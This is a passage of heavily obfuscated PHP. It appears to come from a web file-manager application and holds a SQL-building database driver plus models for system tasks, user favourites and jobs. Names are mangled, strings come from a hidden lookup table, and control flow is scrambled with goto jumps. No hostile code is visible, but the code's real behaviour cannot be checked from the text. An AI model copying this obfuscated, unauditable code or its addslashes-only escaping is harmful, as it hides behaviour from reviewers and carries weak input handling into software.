$_SERVER[¹…ÕÄ]; $EÙŒé›ÏÁ = $fÑ®ë½¬Ó¡[33]; if (!empty($EÕ¯ÚÆğÃº)) { if (is_array($EÕ¯ÚÆğÃº)) { foreach ($EÕ¯ÚÆğÃº as $CàÉÑÓ„šÃ => $BåùÌ¢¶è) { if (!1 !== stripos($BåùÌ¢¶è, $fÑ®ë½¬Ó¡[960])) { $EÙŒé›ÏÁ .= $fÑ®ë½¬Ó¡[50] . $BåùÌ¢¶è; } else { $EÙŒé›ÏÁ .= $fÑ®ë½¬Ó¡[961] . $BåùÌ¢¶è; } } } else { $EÙŒé›ÏÁ .= $fÑ®ë½¬Ó¡[961] . $EÕ¯ÚÆğÃº; } } $EÙŒé›ÏÁ = preg_replace($fÑ®ë½¬Ó¡[962], think_config($fÑ®ë½¬Ó¡[868]) . $fÑ®ë½¬Ó¡[963], $EÙŒé›ÏÁ); return $EÙŒé›ÏÁ; } protected function parseOrder($CÏ˜å¬Ñæ›) { $dğ¹¹‘à å =& $_SERVER[¹…ÕÄ]; if (is_array($CÏ˜å¬Ñæ›)) { $a‘—ßŸ®¬å = array(); foreach ($CÏ˜å¬Ñæ› as $B®Ãïòø©‚ => $C¾ë˜“¡Íï) { if (is_numeric($B®Ãïòø©‚)) { $a‘—ßŸ®¬å[] = $this->parseKey($C¾ë˜“¡Íï); } else { $C¾ë˜“¡Íï = in_array(strtoupper(trim($C¾ë˜“¡Íï)), array($dğ¹¹‘à å[964], $dğ¹¹‘à å[965])) ? $dğ¹¹‘à å[50] . $C¾ë˜“¡Íï : $dğ¹¹‘à å[33]; if (preg_match($dğ¹¹‘à å[966], $B®Ãïòø©‚)) { $a‘—ßŸ®¬å[] = $this->parseKey($B®Ãïòø©‚) . $C¾ë˜“¡Íï; } else { think_exception($dğ¹¹‘à å[967] . $B®Ãïòø©‚); } } } $CÏ˜å¬Ñæ› = implode($dğ¹¹‘à å[47], $a‘—ßŸ®¬å); } return !empty($CÏ˜å¬Ñæ›) ? $dğ¹¹‘à å[968] . $CÏ˜å¬Ñæ› : $dğ¹¹‘à å[33]; } protected function parseGroup($d¬íäÂ»ñì) { $e™¢¶âÍÆœ =& $_SERVER[¹…ÕÄ]; return !empty($d¬íäÂ»ñì) ? $e™¢¶âÍÆœ[969] . $d¬íäÂ»ñì : $e™¢¶âÍÆœ[33]; } protected function parseHaving($b¢¾ôî˜˜Á) { $D³ ‡÷Ö•® =& $_SERVER[¹…ÕÄ]; return !empty($b¢¾ôî˜˜Á) ? $D³ ‡÷Ö•®[970] . $b¢¾ôî˜˜Á : $D³ ‡÷Ö•®[33]; } protected function parseComment($cµ£—£×³) { $DíŸãµÆÌ¿ =& $_SERVER[¹…ÕÄ]; return !empty($cµ£—£×³) ? $DíŸãµÆÌ¿[971] . $cµ£—£×³ . $DíŸãµÆÌ¿[972] : $DíŸãµÆÌ¿[33]; } protected function parseDistinct($DœƒŠÑò) { $D¼§ãÊæ =& $_SERVER[¹…ÕÄ]; return !empty($DœƒŠÑò) ? $D¼§ãÊæ[973] : $D¼§ãÊæ[33]; } protected function parseUnion($F‡í‰…§ÛŞ) { $C–â÷¸Ÿ»‹ =& $_SERVER[¹…ÕÄ]; if (empty($F‡í‰…§ÛŞ)) { return $C–â÷¸Ÿ»‹[33]; } if (isset($F‡í‰…§ÛŞ[$C–â÷¸Ÿ»‹[344]])) { $A¡ÃÖøòëÊ = $C–â÷¸Ÿ»‹[974]; unset($F‡í‰…§ÛŞ[$C–â÷¸Ÿ»‹[344]]); } else { $A¡ÃÖøòëÊ = $C–â÷¸Ÿ»‹[975]; } foreach ($F‡í‰…§ÛŞ as $C°È¯‘õÃÙ) { $c˜ÚÌ™Ç[] = $A¡ÃÖøòëÊ . (is_array($C°È¯‘õÃÙ) ? $this->buildSelectSql($C°È¯‘õÃÙ) : $C°È¯‘õÃÙ); } return implode($C–â÷¸Ÿ»‹[50], $c˜ÚÌ™Ç); } public function insert($d–è„çî—, $c“Ù·£å‘ = array(), $FŞóóˆ¦ğƒ = false) { goto eÚº»â²ÛÛ; dœ†Ï¹‰Øä: $B«Ô¿Òá½ .= $this->parseComment(!empty($c“Ù·£å‘[$F¡°‘Êáù†[350]]) ? $c“Ù·£å‘[$F¡°‘Êáù†[350]] : $F¡°‘Êáù†[33]); return $this->execute($B«Ô¿Òá½, $this->parseBind(!empty($c“Ù·£å‘[$F¡°‘Êáù†[281]]) ? $c“Ù·£å‘[$F¡°‘Êáù†[281]] : array())); goto eÍò¬ªÒ‰Æ; eÚº»â²ÛÛ: $F¡°‘Êáù† =& $_SERVER[¹…ÕÄ]; $eä ·Ì˜§‘ = $Cçìñ–æïù = array(); $this->model = $c“Ù·£å‘[$F¡°‘Êáù†[277]]; goto e¥ˆÖğŸ¨»; e¥ˆÖğŸ¨»: foreach ($d–è„çî— as $E†ùç±ƒÌ‡ => $e–×”í¼Å) { if (is_array($e–×”í¼Å) && $F¡°‘Êáù†[293] == $e–×”í¼Å[0]) { $Cçìñ–æïù[] = $this->parseKey($E†ùç±ƒÌ‡); $eä ·Ì˜§‘[] = $e–×”í¼Å[1]; } elseif (is_scalar($e–×”í¼Å) || is_null($e–×”í¼Å)) { $Cçìñ–æïù[] = $this->parseKey($E†ùç±ƒÌ‡); $eä ·Ì˜§‘[] = $this->parseValue($e–×”í¼Å); } } $B«Ô¿Òá½ = ($FŞóóˆ¦ğƒ ? $F¡°‘Êáù†[846] : $F¡°‘Êáù†[847]) . $F¡°‘Êáù†[848] . $this->parseTable($c“Ù·£å‘[$F¡°‘Êáù†[275]]) . $F¡°‘Êáù†[842] . implode($F¡°‘Êáù†[47], $Cçìñ–æïù) . $F¡°‘Êáù†[843] . implode($F¡°‘Êáù†[47], $eä ·Ì˜§‘) . $F¡°‘Êáù†[844]; $B«Ô¿Òá½ .= $this->parseLock(isset($c“Ù·£å‘[$F¡°‘Êáù†[792]]) ? $c“Ù·£å‘[$F¡°‘Êáù†[792]] : !1); goto dœ†Ï¹‰Øä; eÍò¬ªÒ‰Æ: } public function selectInsert($aÇëÏœ§, $d ´Óãƒ“Ú, $bã©“ßÂ–— = array()) { goto d‚ÁÆ åœ ; Fß”Ä„–Ì: return $this->execute($dÜÆÂéÎöî, $this->parseBind(!empty($bã©“ßÂ–—[$bØœçÊóÚ¼[281]]) ? $bã©“ßÂ–—[$bØœçÊóÚ¼[281]] : array())); goto e¦è™·’Õ; c‹—ô–øÎ›: array_walk($aÇëÏœ§, array($this, $bØœçÊóÚ¼[845])); $dÜÆÂéÎöî = $bØœçÊóÚ¼[976] . $this->parseTable($d ´Óãƒ“Ú) . $bØœçÊóÚ¼[842] . implode($bØœçÊóÚ¼[47], $aÇëÏœ§) . $bØœçÊóÚ¼[954]; $dÜÆÂéÎöî .= $this->buildSelectSql($bã©“ßÂ–—); goto Fß”Ä„–Ì; d‚ÁÆ åœ : $bØœçÊóÚ¼ =& $_SERVER[¹…ÕÄ]; $this->model = $bã©“ßÂ–—[$bØœçÊóÚ¼[277]]; if (is_string($aÇëÏœ§)) { $aÇëÏœ§ = explode($bØœçÊóÚ¼[47], $aÇëÏœ§); } goto c‹—ô–øÎ›; e¦è™·’Õ: } public function update($bÎï‹» ·ä, $b‚êÙÖêÈØ) { $F¶à¦è‰ç¢ =& $_SERVER[¹…ÕÄ]; $this->model = $b‚êÙÖêÈØ[$F¶à¦è‰ç¢[277]]; $eôğë±Š»Á = $F¶à¦è‰ç¢[977] . $this->parseTable($b‚êÙÖêÈØ[$F¶à¦è‰ç¢[275]]) . $this->parseSet($bÎï‹» ·ä) . $this->parseWhere(!empty($b‚êÙÖêÈØ[$F¶à¦è‰ç¢[271]]) ? $b‚êÙÖêÈØ[$F¶à¦è‰ç¢[271]] : $F¶à¦è‰ç¢[33]) . $this->parseOrder(!empty($b‚êÙÖêÈØ[$F¶à¦è‰ç¢[361]]) ? $b‚êÙÖêÈØ[$F¶à¦è‰ç¢[361]] : $F¶à¦è‰ç¢[33]) . $this->parseLimit(!empty($b‚êÙÖêÈØ[$F¶à¦è‰ç¢[288]]) ? $b‚êÙÖêÈØ[$F¶à¦è‰ç¢[288]] : $F¶à¦è‰ç¢[33]) . $this->parseLock(isset($b‚êÙÖêÈØ[$F¶à¦è‰ç¢[792]]) ? $b‚êÙÖêÈØ[$F¶à¦è‰ç¢[792]] : !1) . $this->parseComment(!empty($b‚êÙÖêÈØ[$F¶à¦è‰ç¢[350]]) ? $b‚êÙÖêÈØ[$F¶à¦è‰ç¢[350]] : $F¶à¦è‰ç¢[33]); return $this->execute($eôğë±Š»Á, $this->parseBind(!empty($b‚êÙÖêÈØ[$F¶à¦è‰ç¢[281]]) ? $b‚êÙÖêÈØ[$F¶à¦è‰ç¢[281]] : array())); } public function delete($aÁâ²‡«²¢ = array()) { $dŞëåğ²„¡ =& $_SERVER[¹…ÕÄ]; $this->model = $aÁâ²‡«²¢[$dŞëåğ²„¡[277]]; $aĞ‚Ó¯¬ˆé = $dŞëåğ²„¡[978] . $this->parseTable($aÁâ²‡«²¢[$dŞëåğ²„¡[275]]) . $this->parseWhere(!empty($aÁâ²‡«²¢[$dŞëåğ²„¡[271]]) ? $aÁâ²‡«²¢[$dŞëåğ²„¡[271]] : $dŞëåğ²„¡[33]) . $this->parseOrder(!empty($aÁâ²‡«²¢[$dŞëåğ²„¡[361]]) ? $aÁâ²‡«²¢[$dŞëåğ²„¡[361]] : $dŞëåğ²„¡[33]) . $this->parseLimit(!empty($aÁâ²‡«²¢[$dŞëåğ²„¡[288]]) ? $aÁâ²‡«²¢[$dŞëåğ²„¡[288]] : $dŞëåğ²„¡[33]) . $this->parseLock(isset($aÁâ²‡«²¢[$dŞëåğ²„¡[792]]) ? $aÁâ²‡«²¢[$dŞëåğ²„¡[792]] : !1) . $this->parseComment(!empty($aÁâ²‡«²¢[$dŞëåğ²„¡[350]]) ? $aÁâ²‡«²¢[$dŞëåğ²„¡[350]] : $dŞëåğ²„¡[33]); return $this->execute($aĞ‚Ó¯¬ˆé, $this->parseBind(!empty($aÁâ²‡«²¢[$dŞëåğ²„¡[281]]) ? $aÁâ²‡«²¢[$dŞëåğ²„¡[281]] : array())); } public function select($Aˆ†ÔáøïÍ = array()) { goto F°Œ¥ëôäš; Dàò©î‚™£: if ($dº¶Û…¸µ && !1 !== $c¸øÕ„Œ†¾) { think_cache($A¥´¼ğªó‚, $c¸øÕ„Œ†¾, $dº¶Û…¸µ); } return $c¸øÕ„Œ†¾; goto Aš¾²¬‚†ê; AÒÆŸŠ¢²İ: $dº¶Û…¸µ = isset($Aˆ†ÔáøïÍ[$F÷Œ¦—†Ç¨[345]]) ? $Aˆ†ÔáøïÍ[$F÷Œ¦—†Ç¨[345]] : !1; if ($dº¶Û…¸µ) { $A¥´¼ğªó‚ = is_string($dº¶Û…¸µ[$F÷Œ¦—†Ç¨[92]]) ? $dº¶Û…¸µ[$F÷Œ¦—†Ç¨[92]] : $F÷Œ¦—†Ç¨[979] . md5($A²æÌÔ«›); $FäÅÄáø¨… = think_cache($A¥´¼ğªó‚, $F÷Œ¦—†Ç¨[33], $dº¶Û…¸µ); if (!1 !== $FäÅÄáø¨…) { return $FäÅÄáø¨…; } } $c¸øÕ„Œ†¾ = $this->query($A²æÌÔ«›, $this->parseBind(!empty($Aˆ†ÔáøïÍ[$F÷Œ¦—†Ç¨[281]]) ? $Aˆ†ÔáøïÍ[$F÷Œ¦—†Ç¨[281]] : array())); goto Dàò©î‚™£; F°Œ¥ëôäš: $F÷Œ¦—†Ç¨ =& $_SERVER[¹…ÕÄ]; $this->model = $Aˆ†ÔáøïÍ[$F÷Œ¦—†Ç¨[277]]; $A²æÌÔ«› = $this->buildSelectSql($Aˆ†ÔáøïÍ); goto AÒÆŸŠ¢²İ; Aš¾²¬‚†ê: } public function buildSelectSql($A†µ©‹È«ø = array()) { goto BÂƒœ‡ˆÊ; B£¿ÃÔ§Ä: $Fº£‰™”›İ = $this->parseSql($this->selectSql, $A†µ©‹È«ø); $Fº£‰™”›İ .= $this->parseLock(isset($A†µ©‹È«ø[$d®ã‚²Ñ§Û[792]]) ? $A†µ©‹È«ø[$d®ã‚²Ñ§Û[792]] : !1); if (isset($Eô¾ğÀ…¤)) { think_cache($Eô¾ğÀ…¤, $Fº£‰™”›İ); } goto eÇø•É¿; BÂƒœ‡ˆÊ: $d®ã‚²Ñ§Û =& $_SERVER[¹…ÕÄ]; if (isset($A†µ©‹È«ø[$d®ã‚²Ñ§Û[349]])) { if (strpos($A†µ©‹È«ø[$d®ã‚²Ñ§Û[349]], $d®ã‚²Ñ§Û[47])) { list($FÍ°çØïå, $D†Áğ¶å’Ç) = explode($d®ã‚²Ñ§Û[47], $A†µ©‹È«ø[$d®ã‚²Ñ§Û[349]]); } else { $FÍ°çØïå = $A†µ©‹È«ø[$d®ã‚²Ñ§Û[349]]; } $FÍ°çØïå = $FÍ°çØïå ? $FÍ°çØïå : 1; $D†Áğ¶å’Ç = isset($D†Áğ¶å’Ç) ? $D†Áğ¶å’Ç : (is_numeric($A†µ©‹È«ø[$d®ã‚²Ñ§Û[288]]) ? $A†µ©‹È«ø[$d®ã‚²Ñ§Û[288]] : 20); $EÕì·ñÎÒª = $D†Áğ¶å’Ç * ((int) $FÍ°çØïå - 1); $A†µ©‹È«ø[$d®ã‚²Ñ§Û[288]] = $EÕì·ñÎÒª . $d®ã‚²Ñ§Û[47] . $D†Áğ¶å’Ç; } if (think_config($d®ã‚²Ñ§Û[980])) { $Eô¾ğÀ…¤ = $d®ã‚²Ñ§Û[981] . md5(serialize($A†µ©‹È«ø)); $bèßƒÃÌ‚Á = think_cache($Eô¾ğÀ…¤); if ($bèßƒÃÌ‚Á) { return $bèßƒÃÌ‚Á; } } goto B£¿ÃÔ§Ä; eÇø•É¿: return $Fº£‰™”›İ; goto E¤‡»°†Ïí; E¤‡»°†Ïí: } public function parseSql($bçè‰Ü¸Ñí, $B¡î÷ôæ„ = array()) { $DîÎó¡å† =& $_SERVER[¹…ÕÄ]; $bçè‰Ü¸Ñí = str_replace(array($DîÎó¡å†[982], $DîÎó¡å†[983], $DîÎó¡å†[984], $DîÎó¡å†[985], $DîÎó¡å†[986], $DîÎó¡å†[987], $DîÎó¡å†[988], $DîÎó¡å†[989], $DîÎó¡å†[990], $DîÎó¡å†[991], $DîÎó¡å†[992]), array($this->parseTable("{$B¡î÷ôæ„[$DîÎó¡å†[275]]}"), $this->parseDistinct(isset($B¡î÷ôæ„[$DîÎó¡å†[993]]) ? $B¡î÷ôæ„[$DîÎó¡å†[993]] : !1), $this->parseField(!empty($B¡î÷ôæ„[$DîÎó¡å†[269]]) ? $B¡î÷ôæ„[$DîÎó¡å†[269]] : $DîÎó¡å†[182]), $this->parseJoin(!empty($B¡î÷ôæ„[$DîÎó¡å†[278]]) ? $B¡î÷ôæ„[$DîÎó¡å†[278]] : $DîÎó¡å†[33]), $this->parseWhere(!empty($B¡î÷ôæ„[$DîÎó¡å†[271]]) ? $B¡î÷ôæ„[$DîÎó¡å†[271]] : $DîÎó¡å†[33]), $this->parseGroup(!empty($B¡î÷ôæ„[$DîÎó¡å†[994]]) ? $B¡î÷ôæ„[$DîÎó¡å†[994]] : $DîÎó¡å†[33]), $this->parseHaving(!empty($B¡î÷ôæ„[$DîÎó¡å†[995]]) ? $B¡î÷ôæ„[$DîÎó¡å†[995]] : $DîÎó¡å†[33]), $this->parseOrder(!empty($B¡î÷ôæ„[$DîÎó¡å†[361]]) ? $B¡î÷ôæ„[$DîÎó¡å†[361]] : $DîÎó¡å†[33]), $this->parseLimit(!empty($B¡î÷ôæ„[$DîÎó¡å†[288]]) ? $B¡î÷ôæ„[$DîÎó¡å†[288]] : $DîÎó¡å†[33]), $this->parseUnion(!empty($B¡î÷ôæ„[$DîÎó¡å†[343]]) ? $B¡î÷ôæ„[$DîÎó¡å†[343]] : $DîÎó¡å†[33]), $this->parseComment(!empty($B¡î÷ôæ„[$DîÎó¡å†[350]]) ? $B¡î÷ôæ„[$DîÎó¡å†[350]] : $DîÎó¡å†[33])), $bçè‰Ü¸Ñí); return $bçè‰Ü¸Ñí; } public function getLastSql($bƒí±ÏÖ® = '') { return $bƒí±ÏÖ® ? $this->modelSql[$bƒí±ÏÖ®] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($bÆ×Õ‚Ã›ˆ) { return addslashes($bÆ×Õ‚Ã›ˆ); } public function setModel($E²éäÌ·‰) { $this->model = $E²éäÌ·‰; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto F‚¶°×Â™Ì; dßÊĞÎŠ×Î: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\x2e\164\141\x73\x6b\x4c\x69\x73\x74"; public $field = array("\x6e\141\155\x65", "\164\x79\x70\145", "\x65\166\x65\x6e\x74", "\164\151\155\145", "\144\x65\x73\x63", "\x73\x79\x73\x74\145\155", "\145\156\141\x62\x6c\145", "\x6c\141\x73\164\122\165\x6e", "\163\x6f\162\x74"); public function listData($F×Ë‡Äøù› = false, $aÏÜ¤½™¥ = "\x73\x6f\x72\164", $bµ§Ä¼³ôÈ = false) { return parent::listData($F×Ë‡Äøù›, $aÏÜ¤½™¥, $bµ§Ä¼³ôÈ); } public function add($CÏ’ŞÆèĞ) { $E©´÷·Å =& $_SERVER[¹…ÕÄ]; $c‡ÌùÀ™—  = $this->findByName($CÏ’ŞÆèĞ[$E©´÷·Å[28]]); if ($c‡ÌùÀ™— ) { return !1; } $CÏ’ŞÆèĞ[$E©´÷·Å[1468]] = 0; $CÏ’ŞÆèĞ[$E©´÷·Å[1690]] = $this->getSort(); return parent::insert($CÏ’ŞÆèĞ); } private function getSort() { $F‘ÈìÅ¡ÓÃ =& $_SERVER[¹…ÕÄ]; $A‡šÓ¾§ì = parent::listData(); $CÇùî«¬ğŸ = array_to_keyvalue($A‡šÓ¾§ì, $F‘ÈìÅ¡ÓÃ[33], $F‘ÈìÅ¡ÓÃ[1690]); return empty($CÇùî«¬ğŸ) ? 0 : max($CÇùî«¬ğŸ) + 1; } public function update($d£Ê•àÑÙÕ, $aÚç¾ÊÓÜ³) { $dÜ»àø£¥Œ =& $_SERVER[¹…ÕÄ]; $Bà£ç¢‹” = $this->listData($d£Ê•àÑÙÕ); $EóÎİÚÆÙ = $this->findByName($aÚç¾ÊÓÜ³[$dÜ»àø£¥Œ[28]]); if (!$Bà£ç¢‹” || $EóÎİÚÆÙ && $EóÎİÚÆÙ[$dÜ»àø£¥Œ[388]] != $Bà£ç¢‹”[$dÜ»àø£¥Œ[388]]) { return !1; } return parent::update($d£Ê•àÑÙÕ, $aÚç¾ÊÓÜ³); } public function remove($b«ŸŒŠÓäĞ, $câ•Ó¸øæÆ = false) { $e±ß‰ô„á =& $_SERVER[¹…ÕÄ]; $E‹¢¬’ŒÁš = $this->listData($b«ŸŒŠÓäĞ); if (!$E‹¢¬’ŒÁš) { return; } if (!$câ•Ó¸øæÆ && $E‹¢¬’ŒÁš[$e±ß‰ô„á[1148]] == $e±ß‰ô„á[86]) { return !1; } return parent::remove($b«ŸŒŠÓäĞ); } public function enable($EÃ·ğ¯»¸ì, $BŒ¶ğ¼ÂÏ) { return $this->update($EÃ·ğ¯»¸ì, array($_SERVER[¹…ÕÄ][2072] => $BŒ¶ğ¼ÂÏ)); } public function run($dÀî˜¦»Œ¸) { return $this->update($dÀî˜¦»Œ¸, array($_SERVER[¹…ÕÄ][2082] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($eğÂ²¦ÙĞå) { $EğÖ¾·½·õ =& $_SERVER[¹…ÕÄ]; return array($EğÖ¾·½·õ[1770] => array(USER_ID, $EğÖ¾·½·õ[2083])); } protected function listData() { $AÍ³˜Ÿ¸Óâ =& $_SERVER[¹…ÕÄ]; $AÄ’Ğ‹¤‘ = array($AÍ³˜Ÿ¸Óâ[1496] => USER_ID, $AÍ³˜Ÿ¸Óâ[457] => 0); $fÍËØ¿®â… = $AÍ³˜Ÿ¸Óâ[2084]; $cÄ™ŒŸË†™ = $this->field($fÍËØ¿®â…)->where($AÄ’Ğ‹¤‘)->order($AÍ³˜Ÿ¸Óâ[2085])->select(); return $cÄ™ŒŸË†™ ? $cÄ™ŒŸË†™ : array(); } protected function resetCache() { } protected function listView() { goto DºåâÕ˜Ñ; b²¤Öåƒíì: $Cİ¿–¢éí = array($AÔ·È¤­¹ã[404] => array($AÔ·È¤­¹ã[405], $b®±ùİÆÀ)); $EÃŒˆÆô¬¾ = Model($AÔ·È¤­¹ã[770])->listSource($Cİ¿–¢éí, $a‚öÆçŞšÄ); $EÃŒˆÆô¬¾ = array_merge($EÃŒˆÆô¬¾[$AÔ·È¤­¹ã[73]], $EÃŒˆÆô¬¾[$AÔ·È¤­¹ã[74]]); goto eî±¡”ïˆø; eî±¡”ïˆø: $EÃŒˆÆô¬¾ = array_to_keyvalue($EÃŒˆÆô¬¾, $AÔ·È¤­¹ã[390]); foreach ($cÖ¢°»Ëï’ as $E±²½–Š¶ù => $d‘’‹ôåÈ‡) { $dËß§Ûó…¼ = $EÃŒˆÆô¬¾[$d‘’‹ôåÈ‡[$AÔ·È¤­¹ã[75]]]; $dËß§Ûó…¼ = $dËß§Ûó…¼ ? $dËß§Ûó…¼ : array(); $cÖ¢°»Ëï’[$E±²½–Š¶ù] = array_merge($dËß§Ûó…¼, $d‘’‹ôåÈ‡); } return $cÖ¢°»Ëï’; goto BœëÅêê÷í; BùŠŠ©‡µâ: $b®±ùİÆÀ = array_to_keyvalue($b¨ƒŠ²¢·È, $AÔ·È¤­¹ã[33], $AÔ·È¤­¹ã[75]); if (!$b®±ùİÆÀ) { return $cÖ¢°»Ëï’; } $a‚öÆçŞšÄ = 2000; goto b²¤Öåƒíì; DºåâÕ˜Ñ: $AÔ·È¤­¹ã =& $_SERVER[¹…ÕÄ]; $cÖ¢°»Ëï’ = $this->listData(); $b¨ƒŠ²¢·È = array_filter_by_field($cÖ¢°»Ëï’, $AÔ·È¤­¹ã[29], $AÔ·È¤­¹ã[403]); goto BùŠŠ©‡µâ; BœëÅêê÷í: } protected function addFav($ešßÃùÔ„Å, $A¢ÊÃê „º = '', $Aé°‹Ä·Ğ = "\x73\157\x75\x72\143\x65") { goto e½Ò­ËÎ; cğ”··Ñ: $F—ÇÊÖ°µé = array($BêäåÃëôÑ[1496] => USER_ID, $BêäåÃëôÑ[457] => 0); $Eå˜Ÿ¹µ»Œ = $this->where($F—ÇÊÖ°µé)->max($BêäåÃëôÑ[1690]); if (!$Eå˜Ÿ¹µ»Œ) { $Eå˜Ÿ¹µ»Œ = 0; } goto dã©¦£é‰; dã©¦£é‰: if (!$A¢ÊÃê „º && $Aé°‹Ä·Ğ == $BêäåÃëôÑ[403]) { $dóã¯ì®¶“ = Model($BêäåÃëôÑ[1183])->where(array($BêäåÃëôÑ[404] => $ešßÃùÔ„Å))->find(); if (!$dóã¯ì®¶“) { return !1; } $A¢ÊÃê „º = $dóã¯ì®¶“[$BêäåÃëôÑ[28]]; } $A¢ÊÃê „º = $this->getAutoName($A¢ÊÃê „º); $fêœ¡Çïï = array($BêäåÃëôÑ[1496] => USER_ID, $BêäåÃëôÑ[457] => 0, $BêäåÃëôÑ[407] => $A¢ÊÃê „º, $BêäåÃëôÑ[408] => $ešßÃùÔ„Å, $BêäåÃëôÑ[409] => $Aé°‹Ä·Ğ, $BêäåÃëôÑ[1671] => $Eå˜Ÿ¹µ»Œ + 1); goto B©Ä¡¨ª‹; e½Ò­ËÎ: $BêäåÃëôÑ =& $_SERVER[¹…ÕÄ]; $F—ÇÊÖ°µé = array($BêäåÃëôÑ[1496] => USER_ID, $BêäåÃëôÑ[457] => 0, $BêäåÃëôÑ[409] => $Aé°‹Ä·Ğ, $BêäåÃëôÑ[408] => $ešßÃùÔ„Å); if ($this->where($F—ÇÊÖ°µé)->find()) { return !1; } goto cğ”··Ñ; B©Ä¡¨ª‹: return $this->add($fêœ¡Çïï); goto AŠØ£—ã¸ô; AŠØ£—ã¸ô: } protected function remove($a×ßšÇµÍ) { $Aõù½±Úò =& $_SERVER[¹…ÕÄ]; $Dé¡‡ï±ñ« = array($Aõù½±Úò[1496] => USER_ID, $Aõù½±Úò[406] => $a×ßšÇµÍ); return $this->where($Dé¡‡ï±ñ«)->delete(); } protected function removeByName($fŒÔÀ·öŒ) { $eßµóÕÈˆ’ =& $_SERVER[¹…ÕÄ]; $Eà©Ç„àÔò = array($eßµóÕÈˆ’[1496] => USER_ID, $eßµóÕÈˆ’[407] => $fŒÔÀ·öŒ, $eßµóÕÈˆ’[457] => 0); return $this->where($Eà©Ç„àÔò)->delete(); } protected function rename($b Í“ğ¨¶¥, $d°’¢Äîí«) { $f±“áŠ˜øµ =& $_SERVER[¹…ÕÄ]; if ($b Í“ğ¨¶¥ == $d°’¢Äîí«) { return !1; } $D§¤À‹ÎÛ× = $this->getAutoName($d°’¢Äîí«); if ($d°’¢Äîí« != $D§¤À‹ÎÛ×) { return !1; } $f¿¤ÈÜ¦Ë = array($f±“áŠ˜øµ[1496] => USER_ID, $f±“áŠ˜øµ[457] => 0, $f±“áŠ˜øµ[28] => $b Í“ğ¨¶¥); return $this->where($f¿¤ÈÜ¦Ë)->save(array($f±“áŠ˜øµ[28] => $d°’¢Äîí«)); } protected function resetSort($AµµŒ¢Şí) { $DèÓ‰¿Éğ =& $_SERVER[¹…ÕÄ]; $AµµŒ¢Şí = is_array($AµµŒ¢Şí) ? $AµµŒ¢Şí : array(); $d¢™âô‚Í = array($DèÓ‰¿Éğ[1496] => USER_ID); for ($eĞ†ÃØŸ‡ğ = 0; $eĞ†ÃØŸ‡ğ < count($AµµŒ¢Şí); $eĞ†ÃØŸ‡ğ++) { $d¢™âô‚Í[$DèÓ‰¿Éğ[406]] = $AµµŒ¢Şí[$eĞ†ÃØŸ‡ğ]; $this->where($d¢™âô‚Í)->save(array($DèÓ‰¿Éğ[1671] => $eĞ†ÃØŸ‡ğ + 1)); } return !0; } protected function moveTop($EÔ”¾¢”®ô) { goto f‚Û‡•®¸Ş; dò”ÇÌêí¯: $F„›Å“ÏÈ¸ = $D“Ù¥—ÃÍì; $D“Ù¥—ÃÍì = array_remove_value($D“Ù¥—ÃÍì, $cÚù£“©¤[$EÁªç§—´Î[388]]); array_unshift($D“Ù¥—ÃÍì, $cÚù£“©¤[$EÁªç§—´Î[388]]); goto d”èÂà»†Ä; c»öÄ¶±ç°: if (!$cÚù£“©¤) { return; } $D“Ù¥—ÃÍì = $this->field($EÁªç§—´Î[388])->where($D¤±òôñ•”)->order($EÁªç§—´Î[2085])->select(); $D“Ù¥—ÃÍì = array_to_keyvalue($D“Ù¥—ÃÍì, $EÁªç§—´Î[33], $EÁªç§—´Î[388]); goto dò”ÇÌêí¯; d”èÂà»†Ä: return $this->resetSort($D“Ù¥—ÃÍì); goto dŒ˜ö†Îö; f‚Û‡•®¸Ş: $EÁªç§—´Î =& $_SERVER[¹…ÕÄ]; $D¤±òôñ•” = array($EÁªç§—´Î[1496] => USER_ID, $EÁªç§—´Î[457] => 0); $cÚù£“©¤ = $this->where($D¤±òôñ•”)->where(array($EÁªç§—´Î[28] => $EÔ”¾¢”®ô))->find(); goto c»öÄ¶±ç°; dŒ˜ö†Îö: } protected function moveBottom($c‘ÛóµæÒÏ) { $c„ğØ ñåÇ =& $_SERVER[¹…ÕÄ]; $D‹˜ÅòÀÃ× = array($c„ğØ ñåÇ[1496] => USER_ID, $c„ğØ ñåÇ[457] => 0); $ağ‘èÓõÙ¢ = $this->where($D‹˜ÅòÀÃ×)->max($c„ğØ ñåÇ[1690]); $aÃ“…ˆ˜ = array($c„ğØ ñåÇ[1690] => $ağ‘èÓõÙ¢ + 1); return $this->where($D‹˜ÅòÀÃ×)->where(array($c„ğØ ñåÇ[28] => $c‘ÛóµæÒÏ))->save($aÃ“…ˆ˜); } private function getAutoName($C§á­‚) { goto F•‚¡°§Òó; F•‚¡°§Òó: $f§±ÈŞØÈ =& $_SERVER[¹…ÕÄ]; $D¨¥©Î¿» = array($f§±ÈŞØÈ[1496] => USER_ID, $f§±ÈŞØÈ[457] => 0); $f™ñ‘¤š½¼ = $this->field($f§±ÈŞØÈ[28])->where($D¨¥©Î¿»)->select(); goto cì‡¢ïÀ¢ô; cì‡¢ïÀ¢ô: $f™ñ‘¤š½¼ = array_to_keyvalue($f™ñ‘¤š½¼, $f§±ÈŞØÈ[33], $f§±ÈŞØÈ[28]); if (!$f™ñ‘¤š½¼ || !in_array($C§á­‚, $f™ñ‘¤š½¼)) { return $C§á­‚; } for ($DÇ¬¹è½„Ê = 0; $DÇ¬¹è½„Ê < count($f™ñ‘¤š½¼); $DÇ¬¹è½„Ê++) { if (!in_array($C§á­‚ . "\50{$DÇ¬¹è½„Ê}\51", $f™ñ‘¤š½¼)) { return $C§á­‚ . "\50{$DÇ¬¹è½„Ê}\51"; } } goto e’Ë„ì œ°; e’Ë„ì œ°: return $C§á­‚ . "\x28{$DÇ¬¹è½„Ê}\x29"; goto FºØÊ±ÁÜ; FºØÊ±ÁÜ: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\152\x6f\x62\114\151\163\x74"; public $field = array("\156\141\x6d\x65", "\x64\x65\x73\143", "\x73\157\x72\164"); const JOB_KEY = "\x73\x65\x6c\146\x4a\x6f\142\114\151\163\x74"; public function listData($cîßÅ½ŠÏ¸ = false, $bÇó§Ã«ÕĞ = "\163\157\162\164", $e¤¦§Ù…¦ = false) { return 